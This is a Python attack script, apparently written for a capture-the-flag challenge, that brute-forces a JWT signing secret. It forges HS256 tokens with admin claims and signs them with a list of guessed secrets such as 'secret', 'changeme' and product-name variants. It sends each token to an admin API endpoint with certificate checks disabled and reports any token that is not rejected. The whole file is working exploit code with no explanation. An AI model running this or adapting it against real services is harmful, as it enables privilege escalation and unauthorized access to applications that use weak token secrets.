#!/usr/bin/env python3
import base64, hmac, hashlib, json, urllib.request, ssl, sys

BASE="https://c3fe4955a63156b2.chal.ctf.ae"
URL=BASE+"/api/properties/admin"
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
def jwt(payload, secret, alg="HS256"):
    h=b64(json.dumps({"alg":alg,"typ":"JWT"},separators=(",",":")).encode())
    p=b64(json.dumps(payload,separators=(",",":")).encode())
    signing=h+b"."+p
    sig=hmac.new(secret.encode(),signing,hashlib.sha256).digest()
    return (signing+b"."+b64(sig)).decode()

def req(token):
    r=urllib.request.Request(URL, headers={"Authorization":"Bearer "+token,
        "X-App-Version":"3.7.2","X-Platform":"android"})
    try:
        with urllib.request.urlopen(r,context=ctx,timeout=15) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

payloads=[{"role":"admin"},{"admin":True},{"user":"admin","role":"admin"},
          {"sub":"admin","role":"admin"},{"role":"admin","admin":True}]
secrets=["secret","password","fluidrealty","FluidRealty","jwt","key","admin",
    "changeme","supersecret","secretkey","fluidrealty-secret","fluid","realty",
    "app-secret","mysecret","123456","secret123","fluidrealty2026","token",
    "jwtsecret","your-256-bit-secret","s3cr3t","dev","development","test",
    "fluidrealty_secret","api-secret","house","glass","glasshouses"]

for s in secrets:
    for pl in payloads:
        t=jwt(pl,s)
        code,body=req(t)
        if not (code==403 and "Invalid token" in body):
            print(f"[!] secret={s!r} payload={pl} -> HTTP {code} {body[:200]}")
print("done brute")
